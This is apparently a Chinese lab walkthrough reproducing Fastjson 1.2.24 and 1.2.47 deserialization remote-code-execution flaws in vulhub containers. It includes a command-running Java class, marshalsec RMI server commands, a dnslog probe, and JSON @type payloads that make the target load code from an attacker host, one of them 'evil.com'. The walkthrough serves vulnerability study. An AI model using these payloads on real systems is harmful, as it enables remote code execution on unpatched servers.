---
layout: post
title:  Fastjson 漏洞复现
date: 2023-07-23 01:41:35
updated: 2023-07-23 01:41:35
tags:
  - 网络安全
  - 框架漏洞
---

Fastjson 是阿里巴巴的开源 JSON 解析库，它可以解析 JSON 格式的字符串，支持将 Java Bean 序列化为 JSON 字符串，也可以从 JSON 字符串反序列化到 JavaBean。

<!-- more -->

### Fastjson 1.2.24 反序列化 RCE 漏洞

#### 环境搭建

环境下载链接：https://github.com/vulhub/vulhub

```bash
# 下载项目
wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
# 解压项目
unzip vulhub-master.zip
# 进入目录
cd vulhub-master/fastjson/1.2.24-rce/
# 启动整个环境
docker compose up -d
```

#### 影响版本

* Fastjson <= 1.2.24

#### 指纹信息

1. 修改请求方式为 POST，并输入非法的 JSON 格式，判断是否报错。
2. 使用 dnslog 探测：{"x":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}。

#### 漏洞原理

Fastjson 在对 JSON 字符串进行反序列化的时候，会读取 @type 的内容，试图把 JSON 内容反序列化成这个对象，并且会调用这个类的 set 方法，利用这个特性，构造一个 JSON 字符串，并且使用 @type 反序列化一个自己想要使用的攻击类库。

#### 漏洞复现

注：靶机 ip ：**192.168.1.8**；攻击方(Kali) ip：**192.168.1.9**

vulhub 环境搭建成功后，访问 http://youIp:8090

![image-20230722001736698](http://pic.mewhz.com/blog/image-20230722001736698.png)

使用 Burp Suite 抓包，并修改请求方式为 POST，尝试使用两种方式分别判断是否使用 Fastjson 库。

1. 修改请求方式为 POST，并输入非法的 JSON 格式，判断是否报错：

![image-20230722002332468](http://pic.mewhz.com/blog/image-20230722002332468.png)

2. 使用 dnslog 探测：{"x":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}：

![image-20230722005850015](http://pic.mewhz.com/blog/image-20230722005850015.png)

![image-20230722005919707](http://pic.mewhz.com/blog/image-20230722005919707.png)

两种方法分别判断出使用 Fastjson 库

因为目标环境是 Java 8u102 ，没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，我们可以使用 com.sun.rowset.JdbcRowSetImpl 的利用链，借助 JNDI 注入来执行命令。

**JDNI**：Java Naming and Directory Interface，Java 命名和目录接口；是 SUN 公司提供的一种标准的 Java命名系统接口，JNDI 提供统一的客户端 API ，通过不同的访问提供者接口 JNDI 服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。简单点来说就相当于一个索引库，一个命名服务将对象和名称联系在了一起，并且可以通过它们指定的名称找到相应的对象。

**com.sun.jndi.rmi.object.trustURLCodebase**：允许从远程的 Codebase 加载 Reference 工厂类。

**Codebase**：远程装载类的路径。

**Reference**：该类表示对在 命名/目录 系统外部找到的对象的引用，提供 JDNI 中类的引用功能。

在 Kali 编译以下代码：

```java
// TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

```bash
javac TouchFile.java
# 编译 java 文件为 class 文件
```

防止远程类利用失败，Kali 需同样使用 Java 1.8 的环境进行编译

安装方式可见博客内容：[Linux 安装 Java 1.8 环境](https://mewhz.com/posts/linux-java8)

利用 Python 快速启动临时 web 服务，这样后续漏洞利用时，靶机可以访问到该目录下的文件

**要确保启动 web 服务的目录下存在刚刚编译完成的 class 文件**

```bash
python3 -m http.server 8080
# -m Python解释器在执行命令行时,直接从标准库中查找指定的模块,并执行该模块中的代码
```

利用 marshalsec 工具：https://github.com/mbechler/marshalsec

**marshalsec**：是一款 Java 反序列化利用工具，可以很方便的启动一个 RMI 服务，通过这个服务去访问攻击者准备好的恶意执行类来达到远程命令执行的目的。

**RMI**：Remote Method Invocation，远程方法调用；是允许运行在一个 Java 虚拟机的对象调用运行在另一个 Java 虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。

**JNDI 注入 + RMI 实现攻击的原理**：把恶意的 Reference 类，绑定在 RMI 的 Registry 里面，在客户端(靶机)调用 lookup 远程获取远程类的时候，就会获取到 Reference 对象，获取到 Reference 对象后，会去寻找 Reference 中指定的类，如果查找不到则会在 Reference 中指定的远程地址去进行请求，请求到远程的类后会在本地进行执行。即 JNDI 发现和查找数据和对象，这些对象可以存储在不同的命名或目录服务中，例如远程方法调用(RMI)。

**Registry**：一个注册表，存放着远程对象的位置(ip、端口、标识符)。

**lookup**：获取指定的远程对象。

marshalsec 项目是未编译的源码，所以需要使用 Maven 来生成 Jar 包，方便运行

Mavan 安装方式可见博客内容：[Linux 安装 Maven 环境](https://mewhz.com/posts/linux-maven)

```bash
git clone https://github.com/mbechler/marshalsec.git
# 下载项目
cd marshalsec
# 进入目录
mvn clean package -DskipTests
# 编译项目并生成 Jar 包
# clean 清理本地输出缓存
# package 打包到本项目，生成 jar 文件
# -DskipTests 编译测试文件，跳过测试
cd target
# 进入 Jar 包存放的目录
```

借助 marshalsec 项目，启动一个 RMI 服务器，监听 9999 端口，并指定加载远程类 TouchFile.class

可以理解为一个中介，当有人访问 9999 端口，就会让这个人访问 TouchFile.class 把它自动下载到本地

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.1.9:8080/#TouchFile" 9999
# -cp命令用于指定Java程序运行时所需的classpath路径：
	# 基本语法是 java -cp path/to/class/files MainClass
	# path/to/class/files是Java类文件所在的目录或jar包文件路径
	# MainClass是包含main方法的Java类的全限定类名，它的执行将作为Java程序的入口点
# http:xx 加载的远程类所在的地址和 class 文件名，使用 # 进行划分
# 9999 RMI 服务器的监听端口
```

向靶场发送 payload，并带上 RMI 的地址：

![image-20230722025051350](http://pic.mewhz.com/blog/image-20230722025051350.png)

```json
{
    "b":{
    # b 反序列化后的变量名称，可任意
        "@type":"com.sun.rowset.JdbcRowSetImpl",
     	# 反序列化时的类名
        "dataSourceName":"rmi://192.168.1.9:9999/TouchFile",
        "autoCommit":true
        # # 反序列化时会调用 setDataSourceName 和 setAutoCommit 的方法进行赋值
    }
}
```

**com.sun.rowset.JdbcRowSetImpl**：这是sun 官方提供的一个类库，支持传入一个 RMI 的源，当解析这个 URI 的时候，就会支持 RMI 远程调用，去指定的 RMI 地址中去调用方法。

**setDataSourceName**：给数据源的名字进行赋值，dataSourceName 代表要访问的 RMI 链接。

**setAutoCommit**：调用 lookup 方法，会连接到 RMI 服务器，下载恶意代码到本地并执行。

```bash
docker exec -it 93f /bin/bash
# 进入容器
cd /tmp
# 切换到目录
```

![image-20230722023644790](http://pic.mewhz.com/blog/image-20230722023644790.png)

创建成功~

![image-20230722023701480](http://pic.mewhz.com/blog/image-20230722023701480.png)

![image-20230722023708803](http://pic.mewhz.com/blog/image-20230722023708803.png)

web 服务和 RMI 服务均有反应~

---

### Fastjson 1.2.47 反序列化 RCE 漏洞

#### 影响版本

* Fastjson <= 1.2.47

#### 环境搭建

环境下载链接：https://github.com/vulhub/vulhub

```bash
# 下载项目
wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zip
# 解压项目
unzip vulhub-master.zip
# 进入目录
cd vulhub-master/fastjson/1.2.47-rce
# 启动整个环境
docker compose up -d
```

#### 指纹信息

1. 修改请求方式为 POST，并输入非法的 JSON 格式，判断是否报错。
2. 使用 dnslog 探测：{"x":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}。

#### 漏洞原理

新版本修复了 autoType 的开启；而 Fastjson 中有一个全局缓存，在类加载的时候，如果 autoType 没有开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。java.lang.Class 类对应的 deserializer 为 MiscCodec ，反序列化时会取 json 串中的 val 值并加载这个 val 对应的类。

#### 漏洞复现

注：靶机 ip ：**192.168.1.8**；攻击方(Kali) ip：**192.168.1.9**

vulhub 环境搭建成功后，访问 http://youIp:8090

使用 Burp Suite 抓包，并修改请求方式为 POST，尝试使用两种方式分别判断是否使用 Fastjson 库。

1. 修改请求方式为 POST，并输入非法的 JSON 格式，判断是否报错：

![image-20230723010622595](http://pic.mewhz.com/blog/image-20230723010622595.png)

2. 使用 dnslog 探测：{"x":{"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"}}：

![image-20230723011036697](http://pic.mewhz.com/blog/image-20230723011036697.png)



![image-20230723011024500](http://pic.mewhz.com/blog/image-20230723011024500.png)

两种方法分别判断出使用 Fastjson 库

因为目标环境是 Java 8u102 ，没有 com.sun.jndi.rmi.object.trustURLCodebase 的限制，我们可以使用 com.sun.rowset.JdbcRowSetImpl 的利用链，借助 JNDI 注入来执行命令。

在 Kali 编译以下代码：

```java
// TouchFile.java
import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"touch", "/tmp/success"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

```bash
javac TouchFile.java
# 编译 java 文件为 class 文件
```

防止远程类利用失败，Kali 需同样使用 Java 1.8 的环境进行编译

利用 Python 快速启动临时 web 服务，这样后续漏洞利用时，靶机可以访问到该目录下的文件

**要确保启动 web 服务的目录下存在刚刚编译完成的 class 文件**

```bash
python3 -m http.server 8080
# -m Python解释器在执行命令行时,直接从标准库中查找指定的模块,并执行该模块中的代码
```

利用 marshalsec 工具：https://github.com/mbechler/marshalsec

借助 marshalsec 项目，启动一个 RMI 服务器，监听 9999 端口，并指定加载远程类 TouchFile.class

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.1.9:8080/#TouchFile" 9999
```

向靶场服务器发送 payload：

![image-20230723012333055](http://pic.mewhz.com/blog/image-20230723012333055.png)

```json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
        # 该类放入缓存，反序列化时会先加载此类
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://evil.com:9999/Exploit",
        "autoCommit":true
    }
}
```

```bash
docker exec -it 93f /bin/bash
```

![image-20230723013251365](http://pic.mewhz.com/blog/image-20230723013251365.png)

创建成功~

![image-20230722023701480](http://pic.mewhz.com/blog/image-20230722023701480.png)

![image-20230722023708803](http://pic.mewhz.com/blog/image-20230722023708803.png)

web 服务和 RMI 服务均有反应~

---

### 参考资料

[fastjson反序列化漏洞演示加详细讲解加原理](https://www.bilibili.com/video/BV1Ab4y1d7w1/)

[Fastjson反序列化漏洞(1.2.24 RCE)](https://blog.csdn.net/m0_61506558/article/details/126818902)

[Java之RMI和JNDI](https://blog.csdn.net/u012060033/article/details/121863681)

[fastjson 1.2.24 反序列化 RCE 漏洞复现(CVE-2017-18349)](https://blog.csdn.net/BrickLoveStudy/article/details/124362374)

[Java反序列化工具-marshalsec](https://cloud.tencent.com/developer/article/2228214)

[java -cp详解（ChatGPT生成）](https://blog.csdn.net/weixin_45681165/article/details/129589456)

[Fastjson 1.2.47 远程命令执行漏洞](https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.47-rce)

[fastjson 1.2.24 反序列化导致任意命令执行漏洞](https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce)